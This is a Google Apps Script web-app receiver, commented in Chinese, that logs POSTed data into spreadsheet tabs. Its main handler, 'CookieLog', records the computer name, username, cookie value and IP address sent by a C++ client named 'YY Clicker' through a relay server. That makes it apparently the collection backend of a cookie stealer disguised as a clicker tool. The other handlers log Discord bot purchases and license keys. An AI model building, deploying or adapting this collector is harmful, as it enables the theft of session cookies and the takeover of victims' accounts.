/**
 * Google Apps Script — 統一接收端（Cookie + Bot 用戶資料）
 * 
 * 部署步驟：
 *   1. 前往 https://script.google.com/ 建立新專案
 *   2. 將此程式碼貼入 Code.gs
 *   3. 修改下方 SPREADSHEET_ID 為您的試算表 ID
 *   4. 點擊「部署」→「新增部署作業」→ 類型選「網頁應用程式」
 *   5. 執行身分：「我」
 *   6. 存取權限：「所有人」
 *   7. 部署後複製 Web App URL
 *   8. 將此 URL 設定為：
 *      - Railway Cookie 中轉伺服器的 GOOGLE_SCRIPT_URL 環境變數
 *      - Railway Discord Bot 的 GOOGLE_SCRIPT_URL 環境變數
 *
 * 此腳本會自動根據 POST 資料的欄位判斷來源：
 *   - 若包含 "cookie" 欄位 → 寫入 "CookieLog" 工作表
 *   - 若包含 "purchase_item" 欄位 → 寫入 "用戶資料" 工作表
 *   - 若包含 "key" 欄位 → 寫入 "金鑰記錄" 工作表
 */

// ⚠ 請替換為您的試算表 ID
var SPREADSHEET_ID = "YOUR_SPREADSHEET_ID_HERE";

/**
 * 處理 POST 請求 — 根據資料類型自動分流
 */
function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    
    // ── 判斷資料類型並分流 ──
    
    // 類型 1：Cookie 資料（來自 C++ 客戶端 → Railway 中轉）
    if (data.cookie) {
      return handleCookieData(ss, data);
    }
    
    // 類型 2：用戶購買/授權資料（來自 Discord Bot）
    if (data.purchase_item || data.username) {
      return handleUserData(ss, data);
    }
    
    // 類型 3：金鑰記錄
    if (data.key) {
      return handleKeyData(ss, data);
    }
    
    // 未知類型
    return ContentService
      .createTextOutput(JSON.stringify({ status: "error", message: "未知的資料類型" }))
      .setMimeType(ContentService.MimeType.JSON);
      
  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: "error", message: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

/**
 * 處理 Cookie 資料 — 寫入 "CookieLog" 工作表
 */
function handleCookieData(ss, data) {
  var SHEET_NAME = "CookieLog";
  var sheet = ss.getSheetByName(SHEET_NAME);
  
  // 若工作表不存在，自動建立並加入標題列
  if (!sheet) {
    sheet = ss.insertSheet(SHEET_NAME);
    sheet.appendRow([
      "時間戳記",
      "電腦名稱",
      "使用者名稱",
      "Cookie 值",
      "IP 位址",
      "來源"
    ]);
    var headerRange = sheet.getRange(1, 1, 1, 6);
    headerRange.setFontWeight("bold");
    headerRange.setBackground("#c0392b");
    headerRange.setFontColor("#ffffff");
    sheet.setFrozenRows(1);
  }
  
  var timestamp = new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" });
  sheet.appendRow([
    timestamp,
    data.computer_name || "N/A",
    data.username || "N/A",
    data.cookie || "N/A",
    data.ip || "N/A",
    data.source || "YY Clicker"
  ]);
  
  return ContentService
    .createTextOutput(JSON.stringify({ status: "ok", message: "Cookie 資料已寫入" }))
    .setMimeType(ContentService.MimeType.JSON);
}

/**
 * 處理用戶資料 — 寫入 "用戶資料" 工作表
 */
function handleUserData(ss, data) {
  var SHEET_NAME = "用戶資料";
  var sheet = ss.getSheetByName(SHEET_NAME);
  
  if (!sheet) {
    sheet = ss.insertSheet(SHEET_NAME);
    sheet.appendRow([
      "使用者名稱",
      "使用者ID",
      "使用者購買項目",
      "使用者購買金額",
      "時間戳記"
    ]);
    var headerRange = sheet.getRange(1, 1, 1, 5);
    headerRange.setFontWeight("bold");
    headerRange.setBackground("#4a86c8");
    headerRange.setFontColor("#ffffff");
    sheet.setFrozenRows(1);
  }
  
  sheet.appendRow([
    data.username        || "N/A",
    data.user_id         || "N/A",
    data.purchase_item   || "N/A",
    data.purchase_amount || "N/A",
    data.timestamp       || new Date().toISOString()
  ]);
  
  return ContentService
    .createTextOutput(JSON.stringify({ status: "ok", message: "用戶資料已寫入" }))
    .setMimeType(ContentService.MimeType.JSON);
}

/**
 * 處理金鑰記錄 — 寫入 "金鑰記錄" 工作表
 */
function handleKeyData(ss, data) {
  var SHEET_NAME = "金鑰記錄";
  var sheet = ss.getSheetByName(SHEET_NAME);
  
  if (!sheet) {
    sheet = ss.insertSheet(SHEET_NAME);
    sheet.appendRow([
      "金鑰",
      "使用者名稱",
      "使用者ID",
      "狀態",
      "建立時間"
    ]);
    var headerRange = sheet.getRange(1, 1, 1, 5);
    headerRange.setFontWeight("bold");
    headerRange.setBackground("#27ae60");
    headerRange.setFontColor("#ffffff");
    sheet.setFrozenRows(1);
  }
  
  sheet.appendRow([
    data.key          || "N/A",
    data.username     || "N/A",
    data.user_id      || "N/A",
    data.status       || "已建立",
    data.timestamp    || new Date().toISOString()
  ]);
  
  return ContentService
    .createTextOutput(JSON.stringify({ status: "ok", message: "金鑰記錄已寫入" }))
    .setMimeType(ContentService.MimeType.JSON);
}

/**
 * 處理 GET 請求 — 健康檢查
 */
function doGet(e) {
  return ContentService
    .createTextOutput(JSON.stringify({ 
      status: "ok", 
      message: "Google Apps Script 統一接收端運作中",
      endpoints: ["CookieLog", "用戶資料", "金鑰記錄"]
    }))
    .setMimeType(ContentService.MimeType.JSON);
}
